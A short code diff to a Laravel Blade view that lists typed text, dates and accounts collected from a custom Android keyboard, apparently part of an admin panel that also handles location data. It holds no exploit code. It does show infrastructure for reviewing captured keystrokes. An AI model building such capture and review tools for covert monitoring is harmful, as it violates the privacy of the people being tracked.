@@ -21,7 +21,7 @@ Typing info collected from a custom made Android keyboard.
         <th>{{$l->id}} </th>
         <th>{{$l->text}} </th>
         <th>{{$l->date}} </th>
-        <th>{{$l->account}} </th>
+        <th>{{$l->collectoruser->account}} </th>
         <th>
         {!!Form::open(['action' => ['KeyboardController@destroy', $l->id], 'method' => 'POST', 'class' => 'pull-right'])!!}
         {{Form::hidden('_method', 'DELETE')}}
@@ -30,6 +30,7 @@ Typing info collected from a custom made Android keyboard.
         </th>
 </tr> 
 @endforeach
+
 @endsection
 
 @section('name')
@@ -37,5 +38,5 @@ KeyboardController
 @endsection
 
 @section('search')
-@include('data.search',['url'=>'location','link'=>'location'])
+@include('data.search',['url'=>'keyboard','link'=>'keyboard'])
 @endsection
